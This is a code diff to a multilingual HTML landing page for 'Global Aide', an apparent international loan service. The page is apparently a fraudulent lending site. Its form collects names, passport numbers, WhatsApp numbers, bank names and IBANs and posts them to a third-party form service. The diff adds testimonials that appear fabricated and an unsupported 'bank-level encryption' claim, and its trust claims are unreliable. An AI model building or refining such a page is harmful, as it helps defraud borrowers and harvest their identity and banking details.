@@ -9,46 +9,50 @@
     <style>
         .dark { background-color: #0f172a; color: white; }
         .dark .bg-white { background-color: #1e293b; color: white; border-color: #334155; }
-        .dark .text-blue-900 { color: #60a5fa; }
-        .dark .bg-slate-50 { background-color: #334155; }
-        .progress-bar { transition: width 0.3s ease; }
+        .dark .text-blue-900, .dark .text-blue-700 { color: #60a5fa; }
+        .dark .bg-slate-50, .dark .bg-blue-50\/30 { background-color: #334155; }
+        .dark .text-slate-500 { color: #94a3b8; }
+        input { color: black !important; }
     </style>
 </head>
 <body class="bg-slate-100 font-sans text-slate-900 transition-colors duration-300" id="body">
 
-    <nav class="p-4 flex justify-between items-center max-w-6xl mx-auto">
-        <div class="font-black text-2xl text-blue-700">GLOBAL AIDE</div>
-        <button onclick="toggleDarkMode()" class="p-2 rounded-full bg-slate-200 dark:bg-slate-700 shadow-md">
+    <nav class="p-6 flex justify-between items-center max-w-7xl mx-auto">
+        <div class="font-black text-3xl tracking-tighter text-blue-700 flex items-center gap-2">
+            <i class="fas fa-globe"></i> GLOBAL AIDE
+        </div>
+        <button onclick="toggleDarkMode()" class="p-3 rounded-xl bg-white shadow-sm dark:bg-slate-800 transition-all hover:scale-110">
             <i class="fas fa-moon dark:hidden"></i><i class="fas fa-sun hidden dark:inline text-yellow-400"></i>
         </button>
     </nav>
 
-    <section class="min-h-[50vh] flex flex-col items-center justify-center p-6 bg-gradient-to-br from-blue-800 to-blue-600 text-white text-center shadow-lg">
-        <h1 class="text-5xl md:text-6xl font-black mb-4 tracking-tight">Global Aide</h1>
-        <p class="text-xl mb-8 max-w-2xl opacity-90" id="hero-sub">Soutien financier sérieux, honnête et rapide pour tous vos projets.</p>
+    <section class="min-h-[50vh] flex flex-col items-center justify-center p-6 bg-gradient-to-br from-blue-900 to-blue-700 text-white text-center shadow-2xl rounded-b-[3rem]">
+        <h1 class="text-5xl md:text-7xl font-black mb-6 tracking-tight">Global Aide</h1>
+        <p class="text-xl md:text-2xl mb-10 max-w-3xl opacity-90 font-light" id="hero-sub">Soutien financier sérieux, honnête et rapide pour tous vos projets internationaux.</p>
         
-        <div class="flex flex-wrap justify-center gap-3 mb-10">
-            <button onclick="changeLanguage('fr')" class="bg-white/10 hover:bg-white/30 px-6 py-2 rounded-full border border-white/20 transition-all font-medium">Français 🇫🇷</button>
-            <button onclick="changeLanguage('en')" class="bg-white/10 hover:bg-white/30 px-6 py-2 rounded-full border border-white/20 transition-all font-medium">English 🇺🇸</button>
-            <button onclick="changeLanguage('es')" class="bg-white/10 hover:bg-white/30 px-6 py-2 rounded-full border border-white/20 transition-all font-medium">Español 🇪🇸</button>
-            <button onclick="changeLanguage('de')" class="bg-white/10 hover:bg-white/30 px-6 py-2 rounded-full border border-white/20 transition-all font-medium">Deutsch 🇩🇪</button>
+        <div class="flex flex-wrap justify-center gap-4 mb-12">
+            <button onclick="changeLanguage('fr')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">Français 🇫🇷</button>
+            <button onclick="changeLanguage('en')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">English 🇺🇸</button>
+            <button onclick="changeLanguage('es')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">Español 🇪🇸</button>
+            <button onclick="changeLanguage('de')" class="bg-white/10 hover:bg-white/20 px-6 py-3 rounded-2xl border border-white/20 backdrop-blur-md transition-all font-bold">Deutsch 🇩🇪</button>
         </div>
-        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-12 py-4 rounded-full font-bold text-lg uppercase shadow-xl hover:scale-105 transition-transform" id="btn-start">Commencer mon dossier</a>
+        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-14 py-5 rounded-full font-black text-xl uppercase shadow-[0_10px_30px_rgba(250,204,21,0.4)] hover:scale-105 transition-all" id="btn-start">Commencer mon dossier</a>
     </section>
 
-    <section id="formulaire" class="max-w-5xl mx-auto mt-10 mb-20 p-8 md:p-12 bg-white rounded-[2rem] shadow-2xl border border-gray-100">
-        <div class="text-center mb-10">
-            <h2 class="text-3xl font-extrabold text-blue-900" id="form-title">Demande de Prêt Sécurisée</h2>
-            <p class="text-slate-500 mt-2" id="security-text"><i class="fas fa-shield-check mr-2"></i>Vos données sont cryptées et hautement sécurisées.</p>
+    <section id="formulaire" class="max-w-6xl mx-auto -mt-16 mb-20 p-8 md:p-16 bg-white rounded-[3rem] shadow-2xl border border-gray-100">
+        <div class="text-center mb-12">
+            <div class="inline-block p-3 bg-blue-100 rounded-2xl mb-4 text-blue-700">
+                <i class="fas fa-user-shield text-3xl"></i>
+            </div>
+            <h2 class="text-4xl font-black text-blue-900 mb-4" id="form-title">Demande de Prêt Sécurisée</h2>
+            <p class="text-slate-500 font-medium" id="security-text">Vos données sont protégées par un cryptage de niveau bancaire.</p>
         </div>
         
-        <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-8" id="loanForm">
+        <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-10" id="loanForm">
             
-            <input type="hidden" name="_next" id="next-redirect" value="https://global-aide.vercel.app/merci.html">
-
-            <div class="col-span-full bg-slate-50 p-6 rounded-2xl border border-slate-100">
-                <label class="block text-sm font-black mb-3 uppercase text-blue-800" id="lbl-select-country">1. Sélection de votre pays</label>
-                <select id="country-select" name="pays" onchange="updateCountryData()" class="w-full p-4 bg-white border border-slate-200 rounded-xl text-black font-bold outline-none focus:ring-4 focus:ring-blue-100">
+            <div class="col-span-full bg-slate-50 p-8 rounded-3xl border border-slate-100">
+                <label class="block text-sm font-black mb-4 uppercase text-blue-800 tracking-widest" id="lbl-select-country">1. Sélection de votre pays</label>
+                <select id="country-select" name="pays" onchange="updateCountryData()" class="w-full p-5 bg-white border-2 border-slate-100 rounded-2xl text-black font-bold outline-none focus:border-blue-500 transition-all cursor-pointer shadow-sm">
                     <option value="France" data-code="+33" data-currency="€" id="opt-fr">🇫🇷 France</option>
                     <option value="Allemagne" data-code="+49" data-currency="€" id="opt-de">🇩🇪 Allemagne</option>
                     <option value="Ecuador" data-code="+593" data-currency="$" id="opt-ec">🇪🇨 Équateur</option>
@@ -58,49 +62,92 @@
                 </select>
             </div>
 
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-nom">Nom complet</label>
-                <input type="text" name="nom" required class="w-full p-4 bg-slate-50 border rounded-xl focus:bg-white outline-none text-black">
-            </div>
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-id">N° de Pièce d'identité / Passeport</label>
-                <input type="text" name="piece_identite" required class="w-full p-4 bg-slate-50 border rounded-xl focus:bg-white outline-none text-black" placeholder="EX: A1234567">
-            </div>
-
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-email">E-mail du client</label>
-                <input type="email" name="email_client" required class="w-full p-4 bg-slate-50 border rounded-xl focus:bg-white outline-none text-black">
-            </div>
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-tel">WhatsApp</label>
-                <div class="flex">
-                    <span id="phone-prefix" class="inline-flex items-center px-4 rounded-l-xl border border-r-0 border-slate-200 bg-slate-200 text-slate-700 font-bold">+33</span>
-                    <input type="tel" name="telephone" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-r-xl focus:bg-white outline-none text-black">
+            <div class="space-y-6">
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-nom">Nom complet</label>
+                    <input type="text" name="nom" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+                </div>
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-id">N° de Pièce d'identité / Passeport</label>
+                    <input type="text" name="piece_identite" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+                </div>
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-email">E-mail de contact</label>
+                    <input type="email" name="email_client" required class="w-full p-4 bg-slate-50 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
                 </div>
             </div>
 
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-montant">Montant souhaité</label>
-                <div class="relative">
-                    <input type="number" name="montant" min="1000" max="500000" required class="w-full p-4 bg-slate-50 border rounded-xl focus:bg-white outline-none text-black">
-                    <span id="currency-display" class="absolute right-4 top-4 font-black text-blue-600">€</span>
+            <div class="space-y-6">
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-tel">Numéro WhatsApp</label>
+                    <div class="flex shadow-inner rounded-2xl overflow-hidden">
+                        <span id="phone-prefix" class="inline-flex items-center px-5 bg-slate-200 text-slate-700 font-bold border-r border-slate-300">+33</span>
+                        <input type="tel" name="telephone" required class="w-full p-4 bg-slate-50 outline-none focus:bg-white transition-all">
+                    </div>
                 </div>
-            </div>
-            <div>
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-banque">Nom de la Banque</label>
-                <input type="text" name="banque" required class="w-full p-4 bg-blue-50/30 border rounded-xl focus:bg-white outline-none text-black">
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-montant">Montant souhaité</label>
+                    <div class="relative shadow-inner rounded-2xl overflow-hidden">
+                        <input type="number" name="montant" min="1000" max="500000" required class="w-full p-4 bg-slate-50 outline-none focus:bg-white transition-all">
+                        <span id="currency-display" class="absolute right-5 top-4 font-black text-blue-600 text-lg">€</span>
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-banque">Institution Bancaire</label>
+                    <input type="text" name="banque" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
+                </div>
             </div>
 
             <div class="col-span-full">
-                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-iban">IBAN / Numéro de compte</label>
-                <input type="text" name="iban" required class="w-full p-4 bg-blue-50/30 border rounded-xl focus:bg-white outline-none text-black">
+                <label class="block text-xs font-black mb-2 uppercase text-slate-500" id="lbl-iban">IBAN / Numéro de compte international</label>
+                <input type="text" name="iban" required class="w-full p-4 bg-blue-50/30 border rounded-2xl focus:bg-white outline-none border-transparent focus:border-blue-500 transition-all shadow-inner">
             </div>
 
-            <button type="submit" class="col-span-full bg-blue-700 text-white p-6 rounded-2xl font-black text-xl hover:bg-blue-800 shadow-2xl transition-all" id="btn-submit">
+            <button type="submit" class="col-span-full bg-blue-700 text-white p-7 rounded-3xl font-black text-2xl hover:bg-blue-800 shadow-2xl transition-all hover:-translate-y-1" id="btn-submit">
                 ENVOYER MON DOSSIER
             </button>
         </form>
     </section>
+
+    <section class="max-w-6xl mx-auto mb-24 px-6">
+        <h3 class="text-center text-3xl font-black text-blue-900 mb-16 uppercase tracking-widest" id="test-title">Témoignages Clients</h3>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
+                <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
+                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test1">"Service exceptionnel. J'ai reçu les fonds en moins de 48 heures pour mon projet immobilier en France."</p>
+                <div class="mt-8 flex items-center gap-4">
+                    <div class="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold">JP</div>
+                    <div><p class="font-bold">Jean-Pierre L.</p><p class="text-xs text-blue-500">🇫🇷 France</p></div>
+                </div>
+            </div>
+            <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
+                <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
+                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test2">"Muy confiable. El proceso fue transparente y el equipo me ayudó en todo momento."</p>
+                <div class="mt-8 flex items-center gap-4">
+                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white font-bold">MS</div>
+                    <div><p class="font-bold">Maria S.</p><p class="text-xs text-blue-500">🇪🇨 Ecuador</p></div>
+                </div>
+            </div>
+            <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-blue-50 relative">
+                <i class="fas fa-quote-left text-blue-100 text-5xl absolute top-6 left-6"></i>
+                <p class="relative z-10 text-slate-600 leading-relaxed italic" id="txt-test3">"Global Aide offered me the best rate for my personal loan. Great international service."</p>
+                <div class="mt-8 flex items-center gap-4">
+                    <div class="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center text-white font-bold">RD</div>
+                    <div><p class="font-bold">Robert D.</p><p class="text-xs text-blue-500">🇺🇸 USA</p></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-blue-900 text-white py-12 px-6 rounded-t-[3rem] text-center">
+        <div class="max-w-4xl mx-auto">
+            <div class="text-2xl font-black mb-6">GLOBAL AIDE</div>
+            <p class="opacity-60 text-sm mb-8">© 2025 Global Aide Financial Solutions. Tous droits réservés.</p>
+            <div class="flex justify-center gap-6 opacity-60 text-xs uppercase tracking-widest">
+                <span>Privacy</span><span>Terms</span><span>Cookies</span>
+            </div>
+        </div>
+    </footer>
 
     <script>
         function toggleDarkMode() { document.getElementById('body').classList.toggle('dark'); }
@@ -113,10 +160,10 @@
         }
 
         const translations = {
-            fr: { hero: "Soutien financier sérieux, honnête et rapide.", start: "Commencer mon dossier", title: "Demande de Prêt Sécurisée", security: "Vos données sont cryptées et sécurisées.", selCountry: "1. Sélection de votre pays", countries: ["🇫🇷 France", "🇩🇪 Allemagne", "🇪🇨 Équateur", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Pérou"], nom: "Nom complet", id: "N° Pièce d'identité / Passeport", email: "E-mail du client", tel: "WhatsApp", montant: "Montant souhaité", banque: "Banque", iban: "IBAN / Compte", submit: "Envoyer mon dossier", thanks: "Merci ! Vous serez contacté d'ici 24h sur WhatsApp." },
-            en: { hero: "Serious, honest and fast financial support.", start: "Start application", title: "Secure Loan Request", security: "Your data is encrypted and secure.", selCountry: "1. Select your country", countries: ["🇫🇷 France", "🇩🇪 Germany", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Full Name", id: "ID Number / Passport", email: "Client Email", tel: "WhatsApp", montant: "Amount", banque: "Bank Name", iban: "IBAN / Account", submit: "Send file", thanks: "Thank you! You will be contacted within 24 hours on WhatsApp." },
-            es: { hero: "Apoyo financiero serio, honesto y rápido.", start: "Iniciar solicitud", title: "Solicitud de Préstamo", security: "Sus datos están seguros.", selCountry: "1. Selección de su país", countries: ["🇫🇷 Francia", "🇩🇪 Alemania", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panamá", "🇵🇪 Perú"], nom: "Nombre completo", id: "N° de Identificación / Pasaporte", email: "Correo electrónico", tel: "WhatsApp", montant: "Monto", banque: "Banco", iban: "IBAN / Cuenta", submit: "Enviar solicitud", thanks: "¡Gracias! Se le contactará en 24 horas por WhatsApp." },
-            de: { hero: "Seriöse und schnelle finanzielle Unterstützung.", start: "Antrag starten", title: "Sicherer Kreditantrag", security: "Ihre Daten sind sicher.", selCountry: "1. Wählen Sie Ihr Land", countries: ["🇫🇷 Frankreich", "🇩🇪 Deutschland", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Nom", id: "Ausweisnummer / Reisepass", email: "E-Mail", tel: "WhatsApp", montant: "Betrag", banque: "Bank", iban: "IBAN / Konto", submit: "Senden", thanks: "Vielen Dank! Sie werden innerhalb von 24h per WhatsApp kontaktiert." }
+            fr: { hero: "Soutien financier sérieux, honnête et rapide.", start: "Commencer mon dossier", title: "Demande de Prêt Sécurisée", security: "Vos données sont protégées par un cryptage de niveau bancaire.", selCountry: "1. Sélection de votre pays", countries: ["🇫🇷 France", "🇩🇪 Allemagne", "🇪🇨 Équateur", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Pérou"], nom: "Nom complet", id: "N° Pièce d'identité / Passeport", email: "E-mail de contact", tel: "WhatsApp", montant: "Montant souhaité", banque: "Institution Bancaire", iban: "IBAN / Compte", submit: "Envoyer mon dossier", thanks: "Merci ! Vous serez contacté d'ici 24h sur WhatsApp.", testTitle: "Témoignages Clients", tests: ["Service exceptionnel. Fonds reçus en 48h.", "Très fiable. Équipe transparente.", "Meilleurs taux pour mon prêt."] },
+            en: { hero: "Serious, honest and fast financial support.", start: "Start application", title: "Secure Loan Request", security: "Your data is protected by bank-level encryption.", selCountry: "1. Select your country", countries: ["🇫🇷 France", "🇩🇪 Germany", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Full Name", id: "ID / Passport Number", email: "Contact Email", tel: "WhatsApp", montant: "Amount", banque: "Banking Institution", iban: "IBAN / Account", submit: "Send file", thanks: "Thank you! You will be contacted within 24h on WhatsApp.", testTitle: "Client Testimonials", tests: ["Exceptional service. Funds received in 48h.", "Very reliable. Transparent team.", "Best rates for my personal loan."] },
+            es: { hero: "Apoyo financiero serio, honesto y rápido.", start: "Iniciar solicitud", title: "Solicitud de Préstamo", security: "Sus datos están protegidos con seguridad bancaria.", selCountry: "1. Selección de su país", countries: ["🇫🇷 Francia", "🇩🇪 Alemania", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panamá", "🇵🇪 Perú"], nom: "Nombre completo", id: "N° de Identificación / Pasaporte", email: "Correo de contacto", tel: "WhatsApp", montant: "Monto", banque: "Institución Bancaria", iban: "IBAN / Cuenta", submit: "Enviar solicitud", thanks: "¡Gracias! Se le contactará en 24h por WhatsApp.", testTitle: "Testimonios de Clientes", tests: ["Servicio excepcional. Fondos en 48h.", "Muy confiable. Proceso transparente.", "Las mejores tasas para mi préstamo."] },
+            de: { hero: "Seriöse und schnelle finanzielle Unterstützung.", start: "Antrag starten", title: "Sicherer Kreditantrag", security: "Bankgeprüfte Datensicherheit.", selCountry: "1. Wählen Sie Ihr Land", countries: ["🇫🇷 Frankreich", "🇩🇪 Deutschland", "🇪🇨 Ecuador", "🇸🇻 Salvador", "🇵🇦 Panama", "🇵🇪 Peru"], nom: "Name", id: "Ausweisnummer / Reisepass", email: "E-Mail", tel: "WhatsApp", montant: "Betrag", banque: "Bankinstitut", iban: "IBAN / Konto", submit: "Senden", thanks: "Vielen Dank! Wir melden uns in 24h per WhatsApp.", testTitle: "Kundenbewertungen", tests: ["Außergewöhnlicher Service. Geld in 48h.", "Sehr zuverlässig. Transparent.", "Beste Zinsen für meinen Kredit."] }
         };
 
         function changeLanguage(lang) {
@@ -124,7 +171,7 @@
             document.getElementById('hero-sub').innerText = t.hero;
             document.getElementById('btn-start').innerText = t.start;
             document.getElementById('form-title').innerText = t.title;
-            document.getElementById('security-text').innerHTML = `<i class="fas fa-shield-check mr-2"></i>${t.security}`;
+            document.getElementById('security-text').innerText = t.security;
             document.getElementById('lbl-select-country').innerText = t.selCountry;
             document.getElementById('lbl-nom').innerText = t.nom;
             document.getElementById('lbl-id').innerText = t.id;
@@ -134,8 +181,13 @@
             document.getElementById('lbl-banque').innerText = t.banque;
             document.getElementById('lbl-iban').innerText = t.iban;
             document.getElementById('btn-submit').innerText = t.submit;
+            document.getElementById('test-title').innerText = t.testTitle;
             
-            // Mise à jour de la redirection Formspree pour afficher un message de succès
+            // Témoignages
+            document.getElementById('txt-test1').innerText = `"${t.tests[0]}"`;
+            document.getElementById('txt-test2').innerText = `"${t.tests[1]}"`;
+            document.getElementById('txt-test3').innerText = `"${t.tests[2]}"`;
+
             document.getElementById('loanForm').onsubmit = function() {
                 alert(t.thanks);
                 return true;
@@ -146,6 +198,7 @@
         }
     </script>
 </body>
-    </html>
+                    </html>
+    
         
                     
